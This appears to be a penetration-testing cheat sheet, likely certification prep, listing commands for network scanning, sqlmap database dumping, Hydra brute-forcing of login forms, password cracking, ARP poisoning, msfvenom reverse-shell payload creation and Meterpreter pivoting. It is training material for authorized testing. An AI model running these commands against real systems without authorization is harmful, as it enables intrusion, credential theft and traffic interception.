
Stuck somewhere?? Contact me on fiverr for 1 on 1 sessions by clicking on following link
https://www.fiverr.com/share/2kk1pN



# Host Scan 
___
Find all alive IP address in subnet using namp or Fping
## Nmap

```sh
nmap -sn <CIDR Notation>        
```
## Fping
```
fping -a -g 10.54.12.0/24 2>/dev/null
```

# Port Scan 
___
Now you need to find open ports on each alive IP
#### METHOD - 1
Perform a quick scan using nmap
```sh
sudo nmap -sC -sV -Pn <IP>
```
#### METHOD - 2
Perform all port scan on a IP in step first and then use scripts and version detection to get more information 
```sh
sudo nmap -vv -p- -Pn <IP>  #Lists all open ports as it finds them       

nmap -sC -sV -Pn -vv -p<ports> <IP>       # This will only probe ports selected by you for particular IP
```


# Analyzing HTTP and HTTPS
___

## Virtual Host Routing



Identify if webserver is running any CMS (Content management system) like wordpress

## Wordpress 
To Scan and identify wordpress version and vulnerabilities
```sh
wpscan --url [ip/address]
```


# Checking Routes and Adding Manual Routes
___

#### Checking Routes
```
ip route    # Checking defined routes in linux
route       # Checking defined routes in linux
route print     # Checking defined routes in windows
```
#### Adding Manual Routes
```sh
ip route add <subnet> via <gateway or router address>
```
for example,
```sh
ip route add 192.168.222.0/24 via 10.172.24.1       # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
```


# Finding MAC Addresses
___

```
ipconfig /all       # windows
ifconfig        # *nix OSs
ip addr     # linux
```

# Checking ARP Cache
___


```
arp -a      # Windows
arp     # *nix OSs
ip neighbour        # Linux 
```
# Checking for Listening Ports on a Host
___
```
netstat -ano        # Windows
netstat -tunp       # linux
```

# SQLmap
___

#### Checking for existence of SQL injection
```sh
sqlmap -u ‘http://example.com/view.php?id=1141’ -p id       # GET Method

sqlmap -u ‘http://example.com/view.php’ --data <POST String> -p <parameter>     # POST Method
```
If vulnerable parameter found then you can proceed with extraction of data from database
```sh
sqlmap -u ‘http://example.com/view.php?id=1141’ --dbs     # Getting database names
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> --tables   # Getting table names
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <db_name> -T <tbl_name> --columns    # Getting columns
sqlmap -u ‘http://example.com/view.php?id=1141’ -D <DB_name> -T <tbl_name> -C <column_name_comma_separate> --dump # To dump whole table remove column specification from the command and use only --dump option
```
# John-The-Ripper
___
```sh
john --list=formats
john -incremental -users:<users list> <file to crack>       # if you want to crack only certain users from the password database such as /etc/shadow file
john --show crackme     # Check cracked password after completion of cracking session, where crackme is the password database file
john -wordlist=<wordlist> <file to crack>
john -wordlist=<wordlist> -rules <file to crack>        # rules are used for cracking mangling words such as for cat mangling words could be c@t,caT,CAT,CaT
```
# Hydra
___

```sh
hydra -U ftp        # hydra uses module for each service to attack. To get information about a module this command can be used
hydra -L users.txt -P pass.txt <service://server> <options>
hydra -l admin -P pass.txt -f ftp://10.10.10.10        # Stop attacking on finding first successful hit for user admin
hydra  -L users.txt -P passwords.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:Incorrect credentials" -f -V    # Attacking http post form
```

# Hashcat
___

```sh
hashcat -m 0 -a 0 exam.hash file.dict
hashcat -m 0 -a 0 exam.hash file.dict -r rule/custom.rule       # here rule file contains the rules to creat mangling word such as p@ssword, PaSSworD  https://hashcat.net/wiki/doku.php?id=rule_based_attack 
hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a        # https://hashcat.net/wiki/doku.php?id=mask_attack
```
# SMB Enumeration
___

#### enum4linux
```sh
enum4linux -a <ip>      # Enumerating using enum4linux tool
```
#### smbclient
```sh
smbclient -L //IP -N    # Checking for available shares
smbclient //<target IP>/IPC$ -N     # Connecting to a share
```
#### nmap scripts
```sh
nmap -p445 --script=smb-vuln-* <IP> -v      # This will run all the smb-vuln scripts, if you want to run only few scripts then you can check other available scripts in /usr/share/nmap/scripts
```
# Checking for anonymous FTP 
___
```sh
ftp <IP>        # enter 'anonymous' as username and password
```
# ARP Poisoning
___
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward      # enabling Linux Kernel IP Forwarding, to enable forwarding packet to real destination host
arpspoof -i <interface> -t <target> -r <host>       # if arpspoof do not work then install dsniff which includes this tool also
```
# MySQL
___

If you find mysql information then you can try connecting to mysql service remotely.
```sh
mysql -u <user> -p<password> -h <IP> -D <dbname>
```
# Directory busting
___
#### dirb
```sh
dirb http://<IP>/
dirb http://<IP>/ <dictionary_file_path>    # Use dictionary other than default one
dirb http://<IP>/dir -u admin:admin    # When you want to bust recursively but a dir asks for username password which you know already 
```
#### gobuster
```sh
gobuster dir --url http://<IP>/ --wordlist=<wordlist_file_path>     # -t <value> for more threads
gobuster dir --url http://<IP>/dir --wordlist=<wordlist_file_path> -U username -P password
```

# MsfVenom Payload Creation
___
```sh
msfvenom -p <payload_path> LHOST=<IP> LPORT=<PORT> -f <format> -o shell
```
Check [this](https://netsec.ws/?p=331) for some useful payloads

# Pivoting
___
Meterpreter Autoroute
```
meterpreter> run autoroute -s <subnet>
meterpreter > run autoroute -p      # show active route table
